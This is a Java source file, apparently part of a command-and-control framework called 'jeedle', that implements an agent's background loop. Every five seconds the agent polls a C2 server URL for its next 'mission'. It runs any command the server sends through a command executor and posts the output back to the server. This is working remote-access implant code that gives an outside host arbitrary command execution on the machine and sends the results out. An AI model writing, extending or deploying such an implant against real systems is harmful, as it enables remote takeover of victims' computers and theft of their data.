package jeedle.services;

import com.google.gson.Gson;
import jeedle.entities.Agent;
import jeedle.entities.Artifact;
import jeedle.entities.Mission;
import jeedle.entities.MissionType;
import jeedle.executors.CmdExecutor;
import jeedle.executors.Executor;

import java.io.IOException;

import static jeedle.utils.HttpUtil.sendGET;
import static jeedle.utils.HttpUtil.sendPOST;

public class AgentBackgroundService {
    private final static Gson gson = new Gson();
    private Executor<String> cmdExecutor;

    public AgentBackgroundService() {
        cmdExecutor = new CmdExecutor();
    }

    public void listen(String c2Url, Agent agent) {
        String response;
        while (true) {
            try {
                response = sendGET(c2Url + "/nextMission?agentId=" + agent.getId());
                Mission currentMission = gson.fromJson(response, Mission.class);
                if (currentMission != null) {
                    String artifactContent = "no matching action";
                    if (currentMission.getType() == MissionType.EXEC_CMD) {
                        artifactContent = cmdExecutor.execute(currentMission.getArgs());
                    }

                    Artifact artifact = new Artifact(artifactContent, currentMission.getId(), agent.getId());
                    sendPOST(c2Url + "/artifacts", gson.toJson(artifact));
                }
            } catch (IOException e) {
                System.out.println("IO 40");
            }

            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                System.out.println("Int 45");
            }
        }
    }
}
